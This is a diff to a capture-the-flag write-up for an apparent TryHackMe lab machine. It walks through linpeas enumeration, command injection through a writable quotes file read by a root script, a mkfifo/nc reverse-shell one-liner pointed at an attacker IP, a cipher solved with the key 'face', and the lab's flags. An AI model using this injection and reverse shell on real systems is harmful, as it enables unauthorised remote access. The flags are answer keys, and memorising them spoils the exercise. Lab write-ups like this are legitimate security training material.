@@ -124,7 +124,8 @@ Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.
 Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl       
 ```
 
-<img width="1265" height="851" alt="image" src="https://github.com/user-attachments/assets/ceb9f4c2-d98b-4108-bb94-ca53fd5d4317" />
+<img width="1446" height="818" alt="image" src="https://github.com/user-attachments/assets/5baf05cf-72b5-4ab7-9e6b-3326591dda81" />
+
 
 ---
 
@@ -166,21 +167,128 @@ ssh weston@10.10.49.15
 <img width="841" height="639" alt="image" src="https://github.com/user-attachments/assets/31d00d45-9bd9-4ee8-98e3-be6917f11581" />
 
 
+> ### notice that 
+
 <img width="1208" height="239" alt="image" src="https://github.com/user-attachments/assets/901ba600-467e-4ac2-adaf-e6fc6d43aec9" />
 
+## using **`linpeas`** found
+
+<img width="872" height="182" alt="image" src="https://github.com/user-attachments/assets/6bb8d608-d652-4486-ac9b-5672e291101d" />
+
+<img width="1065" height="498" alt="image" src="https://github.com/user-attachments/assets/af6fd293-3e7c-4b68-a779-c6447ed88bce" />
+
+## Found the script
+
+```python
+#!/usr/bin/env python
+
+#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
+import os
+import random
+
+lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
+quote = random.choice(lines)
+os.system("wall " + quote)
+
+
+```
+
+> ## but we don't have permission to write on it
+
+> # check **`.files`** found
+
+<img width="702" height="178" alt="image" src="https://github.com/user-attachments/assets/497d0d48-cc96-4655-a6a5-be435958f409" />
+
+## ahha i found that we have **`write permission`** on `.quotes`
+
+```
+echo "hacked;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.47.102 4444 >/tmp/f" > .quotes
+```
+
+<img width="1199" height="192" alt="image" src="https://github.com/user-attachments/assets/adf8b8d0-106a-48ee-9d57-1a2e94a7906c" />
+
+<img width="990" height="233" alt="image" src="https://github.com/user-attachments/assets/ef5f2c22-15a3-46a2-a9cf-8061c6e9726c" />
+
+```
+bash -i
+```
+
+```
+cage@national-treasure:~/email_backup$ cat email_3
+cat email_3
+From - Cage@nationaltreasure.com
+To - Weston@nationaltreasure.com
+
+Hey Son
+
+Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
+down what it said. Could you look into it please? I think it could be something to do with his
+account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
+sure he's out to get me. The note said:
+
+haiinspsyanileph
+
+The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
+was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
+hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
+ahahahhahaha. Ahhh Face it... he's just odd. 
+
+Regards
+
+The Legend - Cage
+
+```
+
+
+## passsowrd of sean maybe
+
+```
+haiinspsyanileph
+```
+
+## first cat **`Super_Duper_checklist`**
+
+
+<img width="894" height="290" alt="image" src="https://github.com/user-attachments/assets/2baf61c3-a585-460b-8811-62a673d68f10" />
+
+````
+THM{M37AL_0R_P3N_T35T1NG}
+````
 
 
 
 
+## linpeas
+
+<img width="799" height="154" alt="image" src="https://github.com/user-attachments/assets/508bdfc7-b378-4c6d-b684-05c7fa92956b" />
+
+## found the private key i used it to get better shell 
 
 
+<img width="1177" height="630" alt="image" src="https://github.com/user-attachments/assets/2e271d49-8f74-4bca-96c3-3e83b0f412fe" />
 
 
+## on last email notice that **`face`** word is repeated maybe it's key for cyipher
+
+```
+face
+```
+
+<img width="1402" height="406" alt="image" src="https://github.com/user-attachments/assets/4fff641c-7b29-44a8-9380-8e1cae77245d" />
+
+```
+cageisnotalegend
+```
+
+<img width="1017" height="343" alt="image" src="https://github.com/user-attachments/assets/070b69b8-4c5b-4518-8721-f7c2622ccf66" />
 
 
+<img width="994" height="631" alt="image" src="https://github.com/user-attachments/assets/18bffb1c-8cb3-4938-93ef-64462c5f6757" />
 
 
-
+```
+THM{8R1NG_D0WN_7H3_C493_L0N9_L1V3_M3}
+```
 
 
 
